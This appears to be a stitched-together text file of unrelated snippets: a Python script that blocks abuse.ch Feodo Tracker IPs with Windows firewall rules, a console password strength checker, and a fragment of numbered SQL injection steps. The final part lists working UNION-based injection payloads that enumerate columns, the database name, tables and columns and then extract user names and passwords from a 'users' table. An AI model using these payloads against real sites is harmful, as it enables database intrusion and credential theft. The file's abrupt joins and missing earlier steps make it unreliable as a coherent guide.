import requests, csv, subprocess
# source: Abuse CH
response = requests.get(
"https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
).text

rule = 'netsh advfirewall firewall delete rule name="BadIP"'
subprocess.run(["PowerShell", "-Command", rule])

mycsv = csv.reader(
filter(lambda x: not x.startswith("#"), response.splitlines())
)

for row in mycsv:
    ip = row[1]
    if ip != "dst_ip":
        print("Added Rule to block:", ip)
        rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
        subprocess.run(["PowerShell", "-Command", rule])




import re

def check_password_strength(password):
    if len(password) < 8:
        return "Weak: Password must be at least 8 characters long."
    if not any(char.isdigit() for char in password):
        return "Weak: Password must include at least one number."
    if not any(char.isupper() for char in password):
        return "Weak: Password must include at least one uppercase letter."
    if not any(char.islower() for char in password):
        return "Weak: Password must include at least one lowercase letter."
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        return "Medium: Add special characters to make your password stronger."
    return "Strong: Your password is secure!"

print("Welcome to the Password Strength Checker!")
while True:
    password = input("\nEnter your password (or type 'exit' to quit): ")

    if password.lower() == "exit":
        print("Thank you for using the Password Strength Checker! Goodbye!")
        break
    result = check_password_strength(password)
    print(result)


1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -

Step 11: Extract Database Name
1' UNION SELECT database(),2-- -

Step 12: Extract Table Names
1' UNION SELECT table_name,2
FROM information_schema.tables
WHERE table_schema=database()-- -

Step 13: Extract Column Names
1' UNION SELECT column_name,2
FROM information_schema.columns
WHERE table_name='users'-- -

Step 14: Extract Username & Password
1' UNION SELECT user,password FROM users-- -
